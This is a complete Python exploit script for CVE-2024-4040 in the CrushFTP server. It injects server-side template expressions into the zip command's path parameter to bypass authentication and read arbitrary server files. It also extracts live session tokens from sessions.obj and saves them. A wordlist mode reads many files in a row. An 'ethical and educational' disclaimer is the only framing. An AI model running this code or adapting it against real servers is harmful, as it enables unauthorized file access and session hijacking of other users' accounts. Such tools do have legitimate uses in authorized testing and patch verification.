import requests
import argparse
import re
import urllib3
import xml.etree.ElementTree as ET
from rich.console import Console
from rich.progress import Progress
from rich.style import Style
from rich.text import Text

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


violet = Style(color="bright_magenta")
green = Style(color="green")
red = Style(color="red")
yellow = Style(color="yellow")
grellow = Style(color="yellow2")
cyan = Style(color="cyan")
brightcyan = Style(color="bright_cyan")
urlblue = Style(color="blue1") 
console = Console(highlight=False)


def banner():

    print("""

 ______     ______     __  __     ______     __  __     ______     _____    
/\  ___\   /\  == \   /\ \/\ \   /\  ___\   /\ \_\ \   /\  ___\   /\  __-.  
\ \ \____  \ \  __<   \ \ \_\ \  \ \___  \  \ \  __ \  \ \  __\   \ \ \/\ \ 
 \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\  \ \_\ \_\  \ \_____\  \ \____- 
  \/_____/   \/_/ /_/   \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/ 
                                                                            


    """)
    console.print(Text("CrushFTP SSTI PoC (CVE-2024-4040)", style=cyan))
    console.print(Text("Developer: @stuub", style=violet))
    console.print(Text("Purely for ethical & educational purposes only\n", style=yellow))

def serverSessionAJAX(target):

    console.print(f"[green][*][/green] Attempting to reach ServerSessionAJAX...\n")

    url = f"{target}/WebInterface/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    }

    session = requests.Session()
    response = session.get(url, headers=headers, verify=False, allow_redirects=True)

    if response.status_code == 404:
        console.print(f"[green][+][/green] Successfully reached ServerSessionAJAX")
        if 'CrushAuth' in response.cookies and 'currentAuth' in response.cookies:
            crush_auth_cookie = response.cookies['CrushAuth']
            current_auth_cookie = response.cookies['currentAuth']
            console.print(f"[green][+][/green] CrushAuth Session token: " + crush_auth_cookie)
            console.print(f"[green][+][/green] Current Auth Session token: " + current_auth_cookie)
            return crush_auth_cookie, current_auth_cookie
        else:
            console.print(f"[red][-][/red] 'CrushAuth' or 'currentAuth' cookie not found in the response")
            exit(1)
    else:
       console.print(f"[red[-][/red] Failed to reach ServerSessionAJAX")
       console.print(f"[red[-][/red] Response: " + response.text)
       console.print(f"[red[-][/red] Status code: " + str(response.status_code))
       exit(1)

def SSTI(target, crush_auth_cookie, current_auth_cookie,):

    console.print(f"\n[green][*][/green] Attempting to exploit SSTI vulnerability...")

    url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path={{hostname}}&names=/a"
    console.print("[green][+][/green] URL: [urlblue]{}[/urlblue]".format(url))

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
    }

    session = requests.Session()
    response = session.post(url, headers=headers, verify=False, allow_redirects=True)

    if response.status_code == 200:
        console.print(f"[green][+][/green] Successfully exploited SSTI vulnerability")
        root = ET.fromstring(response.text)
        response_text = root.find('response').text
        console.print(f"[green][+][/green] Response: " + response_text)

    else:
        console.print(f"[red][-][/red] Failed to exploit SSTI vulnerability")
        console.print(f"[red][-][/red] Response: " + response.text)
        console.print(f"[red][-][/red] Status code: " + str(response.status_code))
        exit(1)

def authBypass(target, crush_auth_cookie, current_auth_cookie, lfi=None):
    
        console.print(f"[green][*][/green] Attempting to bypass authentication...")
    
        url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path={{working_dir}}&names=/a"
        console.print(f"\n[green][+][/green] URL: " + url)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
        }
    
        session = requests.Session()
        response = session.post(url, headers=headers, verify=False, allow_redirects=True)
    
        if response.status_code == 200:
            console.print(f"[green][+][/green] Successfully bypassed authentication")
            console.print(f"[green][+][/green] Response: " + response.text)

            root = ET.fromstring(response.text)
            response_text = root.find('response').text
            matches = re.findall(r'file:(.*?)(?=\n|$)', response_text)            
            if matches:
                install_dir = matches[-1].strip()
                console.print(f"[green][+][/green] Installation directory of CrushFTP: " + install_dir)
                file_to_read = lfi if lfi else f"{install_dir}sessions.obj"
                console.print(f"[green][+][/green] File to read: " + file_to_read)
                url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>{file_to_read}</INCLUDE>&names=/a"
                console.print(f"\n[green][+][/green] URL: " + url)
                response = session.post(url, headers=headers, verify=False, allow_redirects=True)

                if response.status_code == 200:
                    console.print(f"[green][+][/green] Successfully extracted sessions file")
                    console.print(f"[green][+][/green] Extracted response: \n" + response.text)
                    if not lfi or lfi == f"{install_dir}sessions.obj":
                        crush_auth_cookies = re.findall(r'CrushAuth=(.*?)(?=\n|$)', response.text)
                        current_auth_cookies = re.findall(r'currentAuth=(.*?)(?=\n|$)', response.text)

                        console.print(f"\n[green][+][/green] Extracted cookies from {file_to_read}: ")
                        console.print(f"\n[green][+][/green] [yellow2]CrushAuth cookies:[/yellow2] " + ', '.join(crush_auth_cookies))
                        console.print(f"\n[green][+][/green] [yellow2]currentAuth cookies: [/yellow2]" + ', '.join(current_auth_cookies))
                        with open (f"sessions.obj", "w") as f:
                            f.write(response.text)

            else:
                print(f"[red][-][/red] Failed to extract file value")
                return None
        else:
            console.print(f"[red][-][/red] Failed to bypass authentication")
            console.print(f"[red][-][/red] Response: " + response.text)
            console.print(f"[red][-][/red] Status code: " + str(response.status_code))
            exit(1)

def lfi_wordlist(target, crush_auth_cookie, current_auth_cookie, wordlist):
    console = Console()
    with open(wordlist, 'r') as f:
        files = [line.strip() for line in f]

    with Progress(console=console) as progress:
        task = progress.add_task("[bright_cyan]Processing wordlist...[/bright_cyan]", total=len(files))

        for file in files:
            if progress.finished: break

            console.print(f"\n[green][*][/green] [cyan]Attempting to read file:[/cyan] {file}")

            url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>{file}</INCLUDE>&names=/a"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
            }

            session = requests.Session()
            response = session.post(url, headers=headers, verify=False, allow_redirects=True)

            if response.status_code == 200:
                console.print(f"[green][+][/green] Successfully read file: {file}")
                console.print(f"[green][+][/green] Response: \n" + response.text)
            else:
                console.print(f"[red[-][/red] Failed to read file: {file}")
                console.print(f"[red[-][/red] Response: " + response.text)
                console.print(f"[red[-][/red] Status code: " + str(response.status_code))

            progress.update(task, advance=1)

def main():
    parser = argparse.ArgumentParser(description="CrushFTP SSTI PoC (CVE-2024-4040)")
    parser.add_argument("-t", "--target", help="Target CrushFTP URL", required=True)
    parser.add_argument("-l", "--lfi", help="Local File Inclusion")
    parser.add_argument("-w", "--wordlist", help="Wordlist for LFI")
    args = parser.parse_args()
    banner()

    crush_auth_cookie, current_auth_cookie = serverSessionAJAX(target=args.target)

    SSTI(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie)
    authBypass(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, lfi=args.lfi)
    if args.wordlist:
        lfi_wordlist(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, wordlist=args.wordlist)

if __name__ == "__main__":
    main()